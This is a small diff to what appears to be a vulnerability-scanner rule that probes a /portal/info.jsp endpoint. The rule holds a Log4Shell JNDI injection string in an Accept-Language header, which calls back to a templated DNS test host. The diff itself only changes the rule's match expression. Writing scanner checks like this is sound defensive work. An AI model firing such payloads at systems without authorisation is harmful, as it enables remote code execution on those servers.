@@ -16,7 +16,7 @@ rules:
       path: /portal/info.jsp
       headers:
         Accept-Language: ${jndi:ldap://{{dnstest}}/tea}
-    expression: "true"
+    expression: response.status >= 200
   r2:
     request:
       method: GET
